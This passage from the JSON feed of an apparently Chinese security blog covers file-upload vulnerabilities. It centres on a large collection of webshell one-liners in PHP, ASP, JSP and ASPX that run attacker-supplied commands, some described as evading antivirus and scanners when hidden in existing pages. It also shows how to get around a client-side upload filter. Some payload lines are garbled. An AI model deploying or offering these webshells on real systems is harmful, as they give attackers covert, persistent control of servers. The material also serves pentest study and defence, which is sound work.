class=\"anchor\" href=\"#参考\">#</a> 参考</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE4MjI4MC5odG1s\">https://www.freebuf.com/articles/web/182280.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGhwLmNuL3RvdXRpYW8tNDE0NzkwLmh0bWw=\">https://www.php.cn/toutiao-414790.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pOWh0bWFyMy9hcnRpY2xlL2RldGFpbHMvNjk4MTIzMDY=\">https://blog.csdn.net/ni9htmar3/article/details/69812306</span></p>\n",
            "tags": [
                "文件包含"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/",
            "title": "web漏洞-文件上传",
            "date_published": "2021-01-12T14:14:02.000Z",
            "content_html": "<h1 id=\"介绍文件上传漏洞\"><a class=\"anchor\" href=\"#介绍文件上传漏洞\">#</a> 介绍文件上传漏洞</h1>\n<blockquote>\n<p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者 WebShell 等。“文件上传” 本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>\n</blockquote>\n<p>产生原因：</p>\n<ul>\n<li>对于上传文件的后缀名（扩展名）没有做较为严格的限制</li>\n<li>对于上传文件的 MIMETYPE (用于描述文件的类型的一种表述方法) 没有做检查</li>\n<li>权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于 shebang 类型的文件）</li>\n<li>对于 web server 对于上传文件或者指定目录的行为没有做限制</li>\n</ul>\n<p>原理：</p>\n<blockquote>\n<p>在 WEB 中进行文件上传的原理是通过将表单设为 multipart/form-data，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段 (multipart) 的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上</p>\n</blockquote>\n<p>文件上传后导致的常见安全问题一般有:</p>\n<p>上传文件是 Web 脚本语言，服务器的 Web 容器解释并执行了用户上传的脚本，导致代<br />\n码执行；</p>\n<p>上传文件是 Flash 的策略文件 crossdomain.xml, 黑客用以控制 Flash 在该域下的行为 (其<br />\n他通过类似方式控制策略文件的情况类似);</p>\n<p>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行:</p>\n<p>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执<br />\n行，被用于钓鱼和欺诈。</p>\n<p>除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口，溢出服务器的后台处理程序，如图片解析模块；或者上传 - 一个合法的文本文件， 其内容包含了 PHP 脚本，再通过 “本地文件包含漏洞 (Local File Include)&quot; 执行此脚本；等等。</p>\n<h1 id=\"有关文件上传的知识\"><a class=\"anchor\" href=\"#有关文件上传的知识\">#</a> 有关文件上传的知识</h1>\n<h2 id=\"webshell\"><a class=\"anchor\" href=\"#webshell\">#</a> webshell</h2>\n<p>什么是 webshell<br />\nWebShell 就是以 asp、php、jsp 或者 cgi 等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些 asp 或 php 后门文件与网站服务器 web 目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。 WebShell 后门隐蔽较性高，可以轻松穿越防火墙，访问 WebShell 时不会留下系统日志，只会在网站的 web 日志中留下一些数据提交记录</p>\n<h2 id=\"一句话木马\"><a class=\"anchor\" href=\"#一句话木马\">#</a> 一句话木马</h2>\n<p>常用的 webshell 就是一句话木马，结合中国菜刀或者 hackbar 等工具可以很高效快捷的获得网站 shell。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>##PHP：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'r00ts'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>cmd<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span>cmd<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span>cmd<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token comment\">//?cmd=phpinfo() @preg_replace(\"/abc/e\",$_REQUEST['cmd'],\"abcd\"); </span><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">//?cmd=phpinfo();</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$func</span> <span class=\"token operator\">=</span><span class=\"token function\">create_function</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">//?func=system&amp;cmd=whoami</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$func</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'func'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token variable\">$array</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$new_array</span><span class=\"token operator\">=</span><span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$array</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">//print_r($new_array);</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">//?cmd=phpinfo()</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>@<span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span>assert<span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">//?cmd=phpinfo()</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token variable\">$array</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token function\">call_user_func_array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"assert\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$array</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">//?func=system&amp;cmd=whoami</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token variable\">$array1</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token variable\">$func</span> <span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'func'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token function\">array_filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$array1</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">usort</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'asse'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'rt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span> php环境>=&lt;5.6才能用</pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">usort</span><span class=\"token punctuation\">(</span><span class=\"token operator\">...</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>  php环境>=5.6才能用</pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_</span><span class=\"token operator\">=</span>@<span class=\"token variable\">$_GET1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span>@<span class=\"token variable\">$_</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST1</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">eval_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST1</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token function\">eval_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST1</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span>//容错代码 </pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>//使用Lanker一句话客户端的专家模式执行相关的PHP语句 </pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cc'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cc'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cc'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[email]/e\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'h'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>/*使用这个后,使用菜刀一句话客户端在配置连接的时候在\"配置\"一栏输入*/:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>O</span><span class=\"token punctuation\">></span></span>h=@eval_r($_POST1);<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>O</span><span class=\"token punctuation\">></span></span> </pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token string backtick-quoted-string\">`$_GET['r']`</span> <span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">language</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>php<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">@<span class=\"token function\">eval_r</span><span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span>sb<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span> //绕过<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>限制的一句话</pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token function\">php </span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token delimiter important\">?></span></span>   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！</pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token delimiter important\">?></span></span><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">system </span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span> </pre></td></tr><tr><td data-num=\"62\"></td><td><pre>加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！</pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>&lt;%execute request(“class”)%>&lt;%'&lt;% loop &lt;%:%>&lt;%'&lt;% loop &lt;%:%>&lt;%execute request (“class”)%>&lt;%execute request(“class”)'&lt;% loop &lt;%:%> </pre></td></tr><tr><td data-num=\"65\"></td><td><pre>无防下载表，有防下载表可尝试插入以下语句突破的一句话 </pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>&lt;%eval(request(“1″)):response.end%> 备份专用</pre></td></tr></table></figure><pre><code class=\"language-jsp\">##JSP：\n&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt; \n提交客户端 \n&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;textareaname=&quot;t&quot;&gt;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=&quot;submit&quot;value=&quot;提交&quot;&gt;&lt;/form&gt;\n</code></pre>\n<pre><code class=\"language-asp\">##ASP\n&lt;%eval(Request.Item[&quot;r00ts&quot;],”unsafe”);%&gt;\n\n&lt;%IfRequest(“1″)&lt;&gt;”&quot;ThenExecuteGlobal(Request(“1″))%&gt; \n\n&lt;%execute(request(“1″))%&gt; \n\n&lt;scriptrunat=server&gt;execute request(“1″)&lt;/script&gt; 不用'&lt;,&gt;‘的asp一句话 \n</code></pre>\n<pre><code class=\"language-aspx\">##aspx\n&lt;scriptrunat=”server”&gt;WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y (“add6bb58e139be10″);&lt;/script&gt; \n\n&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt; \n\n&lt;%eval request(chr(35))%&gt;  不用双引号的一句话。\n</code></pre>\n<h1 id=\"文件上传的攻击与防御方法\"><a class=\"anchor\" href=\"#文件上传的攻击与防御方法\">#</a> 文件上传的攻击与防御方法</h1>\n<h2 id=\"本地前端限制\"><a class=\"anchor\" href=\"#本地前端限制\">#</a> 本地前端限制</h2>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">var</span> file <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementsByName</span><span class=\"token punctuation\">(</span><span class=\"token string\">'upload_file'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>file <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">||</span> file <span class=\"token operator\">==</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请选择要上传的文件!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// 定义允许上传的文件类型</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">var</span> allow_ext <span class=\"token operator\">=</span> <span class=\"token string\">\".jpg|.png|.gif\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token comment\">// 提取上传文件的类型</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">var</span> ext_name <span class=\"token operator\">=</span> file<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">.</span><span class=\"token function\">lastIndexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">// 判断上传文件类型是否允许上传</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>allow_ext<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>ext_name <span class=\"token operator\">+</span> <span class=\"token string\">\"|\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">var</span> errMsg <span class=\"token operator\">=</span> <span class=\"token string\">\"该文件不允许上传，请上传\"</span> <span class=\"token operator\">+</span> allow_ext <span class=\"token operator\">+</span> <span class=\"token string\">\"类型的文件,当前文件类型为：\"</span> <span class=\"token operator\">+</span> ext_name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>errMsg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理</h3>\n<p>在表单中使用 onsumbit=checkFile () 调用 js 函数来检查上传文件的扩展名。当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。</p>\n<h3 id=\"绕过方法\"><a class=\"anchor\" href=\"#绕过方法\">#</a> 绕过方法</h3>\n<p>这种限制很简单，通过浏览器 F12 很简单的修改文件后缀名就可以完成绕过检查，或者是讲木马修改后缀名后上传，通过改包工具修改上传。如果是 JS 脚本检测，在本地浏览器客户端禁用 JS 即可。可使用火狐浏览器的 NoScript 插件、IE 中禁用掉 JS 等方式实现绕过。</p>\n<h3 id=\"操作方法\"><a class=\"anchor\" href=\"#操作方法\">#</a> 操作方法</h3>\n<p>准备一句话木马：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>@<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span 